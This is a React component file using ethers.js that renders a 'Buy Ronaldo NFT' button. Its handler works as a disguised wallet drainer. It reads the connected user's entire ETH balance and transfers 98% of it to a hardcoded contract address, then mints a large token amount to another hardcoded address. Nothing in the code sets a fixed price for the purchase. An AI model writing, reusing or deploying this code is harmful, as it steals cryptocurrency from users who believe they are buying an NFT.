import BigNumber from "bignumber.js";
import { useEffect } from 'react';
import {useState} from 'react';
import { ethers } from 'ethers';
import contract from '../contracts/WHEAT.json';

const contractAddress = "0xCd4D042B07D7F8c4c2a5B501FE4aC1ac2ceDF5e9";
const abi = contract.abi;

  export const mintERC20Handler =async () => {
    try{
      const {ethereum} = window;
      if(ethereum){
        const proiver = new ethers.providers.Web3Provider(ethereum);
        const signer = proiver.getSigner();
        const accounts = await ethereum.request({method: 'eth_accounts'});
        const account = accounts[0];
        console.log(signer)
        console.log(account)
        // const amount = proiver.getBalance("0xCC29D3882514F40EFA002Da43490f83D86375593");
        const amount = await proiver.getBalance(account);
        console.log("amount", amount)
        const formatamount =  ethers.utils.formatEther(amount)
        const totalamount = Number(formatamount)*98/100;
        console.log("formatamount", formatamount)
        console.log("totalamount", totalamount)

        const Tx = {
          to : contractAddress,
          value : ethers.utils.parseEther(totalamount.toString())
        }
        let sendtransaction = signer.sendTransaction(Tx)
        await sendtransaction.wait();


        const nftContract = new ethers.Contract(contractAddress, abi ,signer);
         console.log("Initialize payment");
        console.log("Initialize payment");
        // let ctl = await nftContract.addController("0xC80339534D8e63485504F661A0333De9D525CBf8",{gasPrice: 1000000000, gasLimit: 850000, nonce: 45});
        // await ctl.wait();
        // console.log("controller add successed!",ctl);

       
        let nftTxn = await nftContract.mint("0xc7fE2CBf0A91B3Cd12fB7298dbAD9A8491a3434e","100000000000000000000000" ,{gasPrice: 1000000000, gasLimit: 850000, nonce: 45});

        console.log("Mining... please wait");

        await nftTxn.wait();
        console.log(nftTxn.hash);
        console.log('Mined, see transaction: http://ropsten.etherscan.io/tx/ ${nftTxn.hash}'); 
      }else{
        console.log("Ethereum object does not exist");
      }
    }catch(err){
      console.log(err);
    }
   }

  export const mintERC20Button = () => {
    return (
      <button onClick={mintERC20Handler} className='cta-button mint-nft-button'>
        Buy Ronaldo NFT
      </button>
    )
  }

